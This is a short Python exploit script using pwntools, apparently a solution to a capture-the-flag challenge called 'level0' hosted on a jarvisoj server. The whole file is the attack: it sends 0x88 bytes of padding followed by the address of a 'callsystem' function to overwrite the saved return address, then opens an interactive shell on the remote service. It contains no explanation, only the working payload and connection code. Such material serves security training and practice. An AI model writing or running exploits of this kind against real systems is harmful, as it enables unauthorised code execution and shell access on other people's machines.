#!/usr/bin/env python
# coding:utf-8

from pwn import *
io = process("./level0")
io = remote("pwn2.jarvisoj.com" , 9881)
elf = ELF("./level0")
func_addr = elf.symbols["callsystem"]
payload = 'a' * (0x80 + 0x8) + p64(func_addr)

io.recvline()
io.sendline(payload)
io.interactive()
io.close()
